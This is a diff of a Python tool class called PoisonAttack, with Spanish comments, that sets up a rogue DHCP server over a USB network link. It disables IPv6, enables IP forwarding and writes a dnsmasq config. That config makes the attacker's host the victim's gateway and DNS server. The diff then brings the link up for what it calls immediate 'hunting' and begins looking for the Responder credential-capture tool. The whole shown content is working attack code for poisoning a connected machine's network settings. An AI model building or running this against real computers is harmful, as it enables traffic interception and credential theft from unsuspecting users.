@@ -80,75 +80,69 @@ class PoisonAttack:
             os.system(f"sudo nmcli device set {iface} managed no 2>/dev/null")
             os.system(f"sudo systemctl stop dhcpcd 2>/dev/null")
             os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
-            time.sleep(1)
 
-            self.log("[*] Reset de interfaz y supresión IPv6/RA...")
+            # 1. BAJAR LA INTERFAZ PRIMERO (Para preparar la trampa)
             os.system(f"sudo ip link set {iface} down 2>/dev/null")
-            time.sleep(1)
-            os.system(f"sudo ip link set {iface} up")
-            time.sleep(2)
-
-            # Desactivar IPv6 para evitar esperas de SLAAC
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
+            time.sleep(0.5)
 
             ip = "192.168.10.1"
             subnet_mask = "24"
             ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"
 
-            self.log(f"[*] Asignando IP estática {ip}/{subnet_mask} a {iface}...")
+            # 2. ASIGNAR IP FORZANDO EL BROADCAST CORRECTO (Corrige el 0.0.0.0)
+            self.log(f"[*] Asignando IP estática y Broadcast a {iface}...")
             os.system(f"sudo ip addr flush dev {iface} 2>/dev/null")
-            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface}")
+            os.system(f"sudo ip addr add {ip}/{subnet_mask} broadcast 192.168.10.255 dev {iface}")
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
-            os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
+            
+            # Desactivar IPv6 para evitar confusiones de enrutamiento
+            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
+            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
+            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
 
-            # ===== NUEVO: reglas de firewall para permitir DHCP =====
+            # 3. FIREWALL
             self.log("[*] Configurando firewall para DHCP...")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 67 -j ACCEPT")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 68 -j ACCEPT")
             os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --sport 67 -j ACCEPT")
-            os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --dport 68 -j ACCEPT") 
-            # ======================================================
+            os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --dport 68 -j ACCEPT")
 
-            # Configuración dnsmasq (DHCP sin DNS)
+            # 4. CONFIGURACIÓN EN /TMP (Previene errores de permisos del demonio)
+            config_path = "/tmp/dnsmasq_poison.conf"
             config_dhcp = (
                 f"interface={iface}\n"
+                f"bind-dynamic\n"
                 f"listen-address={ip}\n"
                 f"dhcp-range={ip_range}\n"
-                f"dhcp-option=1,255.255.255.0\n"       
+                f"dhcp-option=1,255.255.255.0\n"
                 f"dhcp-option=3,{ip}\n"
                 f"dhcp-option=6,{ip}\n"
-                f"dhcp-option=28,192.168.10.255\n"     
+                f"dhcp-option=28,192.168.10.255\n"
                 f"dhcp-option=15,\n"
                 f"dhcp-option=252,\n"
-                f"bind-dynamic\n"
                 f"no-resolv\n"
                 f"no-hosts\n"
-                f"port=0\n"          # Sin DNS para evitar conflictos
+                f"port=0\n"
                 f"log-dhcp\n"
             )
-            with open("dnsmasq_temp.conf", "w") as f:
+            with open(config_path, "w") as f:
                 f.write(config_dhcp)
+            os.system(f"sudo chmod 644 {config_path}")
 
-            self.log("[*] Iniciando dnsmasq...")
+            # 5. INICIAR DNSMASQ ANTES DE LEVANTAR EL ENLACE
+            # Al usar bind-dynamic, dnsmasq puede arrancar aunque la interfaz esté caída.
+            self.log("[*] Iniciando servidor DHCP en modo de espera...")
             self.dns_proc = subprocess.Popen(
-                ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
+                ["sudo", "dnsmasq", "-C", config_path, "-d"],
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
             )
-            time.sleep(2)
+            time.sleep(1) # Un segundo para que el proceso asiente el puerto 67
 
-            # Verificar que dnsmasq esté corriendo
-            if self.dns_proc.poll() is not None:
-                err = self.dns_proc.stderr.read()
-                self.log(f"[!] dnsmasq falló al iniciar: {err.strip()}")
-                self.log("[*] Reintentando en modo foreground...")
-                self.dns_proc = subprocess.Popen(
-                    ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d", "--keep-in-foreground"],
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                )
-            else:
-                self.log("[+] dnsmasq escuchando correctamente.")
+            # 6. AHORA LEVANTAMOS EL ENLACE (Evita perder el primer paquete del host)
+            self.log("[*] Levantando enlace USB para cacería inmediata...")
+            os.system(f"sudo ip link set {iface} up")
+            os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
+            time.sleep(1)
 
             # Detección de Responder
             responder_paths = [
